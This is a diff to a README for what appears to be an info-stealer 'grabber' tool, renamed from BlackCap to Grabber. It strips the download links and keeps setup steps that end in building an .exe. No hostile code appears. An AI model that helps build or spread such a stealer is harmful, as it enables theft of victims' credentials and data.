@@ -17,12 +17,12 @@ That's why I won't be responsible for any damage caused by this script if you us
 
 
 
-## <a id="setup"></a> 📁 〢 Setting up BlackCap
+## <a id="setup"></a> 📁 〢 Setting up Grabber
 
-1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
-2. Install [BlackCap Files](https://github.com/KSCHdsc/BlackCap-Grabber/archive/refs/heads/main.zip)
-3. Install all requirements [install.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/install.bat)
-4. Click on start.bat [start.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/start.bat)
+1. Install [Python]
+2. Install [Grabber Files]
+3. Install all requirements [install.bat]
+4. Click on start.bat [start.bat]
 5. Complete the configuration
 6. You have your .exe file enjoy :)
 
